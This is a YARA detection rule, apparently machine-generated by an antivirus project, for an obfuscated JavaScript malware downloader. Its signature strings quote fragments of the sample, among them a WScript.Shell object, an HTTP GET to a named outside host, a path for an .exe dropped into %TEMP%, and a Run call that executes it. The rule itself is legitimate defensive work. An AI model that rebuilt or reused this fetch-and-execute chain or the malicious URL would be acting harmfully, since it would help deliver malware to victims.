rule sig_20160328_bbe69726d60806bb429cead8b6a2ab2b {
  meta:
    description = "datamaliciousorder - file 20160328_bbe69726d60806bb429cead8b6a2ab2b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fd069eb1180fd2deafee1055f65854d8ec29c5696a864aaff14d579b9049f473"

  strings:
    $s1  = "function Updpesac() {return Pxqsqo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"A5Lb7EazXl.exe\";};" fullword ascii
    $s2  = "do {WScript[Sygeutrus](Uwlszxxay() * 11)} while (Ffrypk[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Pxqsqo = function Tyjdagy() {return WScript[Nlcyiiv](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Rpznlmgde(Krdxfvuxgt, Ihmbndscoe){return Krdxfvuxgt - Ihmbndscoe;};" fullword ascii
    $s5  = "Ffrypk[Ersyykyc](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Qpjxcqr(Lfhyk){Pxqsqo[\"Run\"](Lfhyk, Aahvukl, Aahvukl);};" fullword ascii
    $s7  = "function Ulzmhy() {return ((Gaukf == true) && (Gaukf == Qmubz)) ? 1 : Aahvukl;};" fullword ascii
    $s8  = "Gaukf = true; " fullword ascii
    $s9  = "function Urpqfzq(){return Nlcyiiv;};" fullword ascii
    $s10 = " while (Lkrfjuxxcy){" fullword ascii
    $s11 = "Qmubz = true; " fullword ascii
    $s12 = "function Jlwnqh()" fullword ascii
    $s13 = "var Qmubz = false;" fullword ascii
    $s14 = "var Qlfuoqfh = false;" fullword ascii
    $s15 = "function Aepdd(){return Vcblbuk;};" fullword ascii
    $s16 = "var Gaukf = false;" fullword ascii
    $s17 = "var Cqtsf = new this[\"Date\"]();" fullword ascii
    $s18 = "function Urglwzxeta(Oikglhns) {var Feazccmz = (1, 2, 3, 4, 5, Oikglhns); return Feazccmz;};" fullword ascii
    $s19 = "return Rpznlmgde(Doynby, Qrewqn);" fullword ascii
    $s20 = "function Uwlszxxay(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}